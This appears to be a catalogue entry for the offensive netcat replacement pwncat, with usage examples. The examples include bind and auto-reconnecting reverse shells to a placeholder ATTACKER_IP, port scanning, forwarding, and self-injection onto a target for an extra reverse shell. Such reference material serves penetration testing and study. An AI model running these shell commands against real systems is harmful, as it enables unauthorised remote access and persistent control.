---
name: "pwncat"
categories:
  - blackarch-backdoor
version: "0.1.2"
homepage: "https://github.com/cytopia/pwncat"
packaged-by: [blackarch, aur, nixpkgs]
blackarch-builddate: "2026-01-13"
build-system: scripts
license: MIT
meta-checked: "2026-11-09"
github-repo: "cytopia/pwncat"
github-stars: 1959
github-pushed: "2022-09-23"
github-archived: false
github-issues: 15
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.5
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# pwncat

> Netcat alternative in Python 2/3 with bind/reverse shells, scanning, forwarding and firewall/IDS/IPS evasion tricks.

## What it's for

Cytopia's pwncat (pwncat.org) is a netcat replacement, not a framework: one binary with connect, listen, zero-I/O (scan) and forward modes over TCP and UDP, IPv4 and IPv6, largely flag-compatible with classic netcat. On top of that it adds the things netcat lacks — a scriptable send/receive engine, port scanning with banner grabbing, local and remote port forwarding, and a set of techniques for surviving or evading firewalls and network IDS/IPS: self-injecting onto a target over a primitive shell, keep-alive pings to hold UDP sessions, HTTP(S)-looking sessions, and reconnect loops that ride out dropped reverse shells. Do not confuse it with [[pwncat-cs]] (calebstewart/pwncat, command `pwncat-cs`), an unrelated post-exploitation platform: when shell sessions with `download`/`upload` commands and a `(local) pwncat$` prompt are described, that is pwncat-cs, not this tool.

The corpus evidence indexed under this tool's name shows `pwncat-cs -lp 1337` sessions — i.e. it belongs to [[pwncat-cs]] — so the use cases below are derived from upstream documentation only.

## Typical use cases

### Serve a persistent bind shell

```
pwncat -l -e '/bin/bash' 8080 -k
```

Outcome: listens on port 8080 and spawns `/bin/bash` for each client; `-k` (keep-open) makes the server accept new clients after a session disconnects instead of exiting.

### Send a reverse shell that survives disconnects

```
pwncat -e '/bin/bash' ATTACKER_IP 4444 --reconn --reconn-wait 1
```

Outcome: connects back to ATTACKER_IP:4444 and executes bash; if the session dies (including Ctrl-C at the far end), the client retries every second until it reconnects.

### Port scan with banner grabbing

```
pwncat -z 198.51.100.10 1-1023 --banner
```

Outcome: zero-I/O mode sweeps ports 1-1023 (lists `80,443,8080` and increments `4444+2` also work, `-u` switches to UDP) and reports open/closed plus any service banner sent on connect.

### Proxy a remote service to a local port

```
pwncat -L 0.0.0.0:5000 target.example.com 3306
```

Outcome: a local listener on 0.0.0.0:5000 forwards through an internal client to target.example.com:3306 — the remote MySQL (or any TCP/UDP) service becomes reachable from your machine.

### Bridge two outbound connections behind an egress-only host

```
pwncat -R ATTACKER_IP:4444 target.example.com 3306
```

Outcome: on a host that can only connect out, pwncat opens one connection to your listener at ATTACKER_IP:4444 and one to target.example.com:3306 and bridges them — you reach the target's service from your listener with no inbound ports needed.

### Self-inject onto a target over a primitive shell

```
pwncat -l 4444 --self-inject /bin/bash:ATTACKER_IP:4445
```

Outcome: when a target's basic reverse shell (bash, php, perl, python, nc, ...) hits port 4444, this listener uses that channel to deploy pwncat onto the target and start an additional, auto-reconnecting reverse shell back to port 4445.
